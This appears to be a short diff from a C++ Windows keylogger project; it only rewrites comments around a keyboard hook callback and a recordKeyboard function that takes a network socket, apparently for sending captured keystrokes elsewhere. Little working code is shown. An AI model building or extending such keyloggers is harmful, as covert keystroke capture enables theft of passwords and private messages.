@@ -10,7 +10,7 @@ bool isShiftOn{};
 bool isCtrlOn{};
 bool isCapsOn{};
 
-// function listens to all keyboard clicks. Will be used as a thread
+// callback function to get all clicked keys
 LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	static int last;
@@ -254,6 +254,8 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// function will be used as a thread
+// calls the callback function
 void KeyLogger::recordKeyboard(SOCKET sock)
 {
 	_keyboardSock = sock;
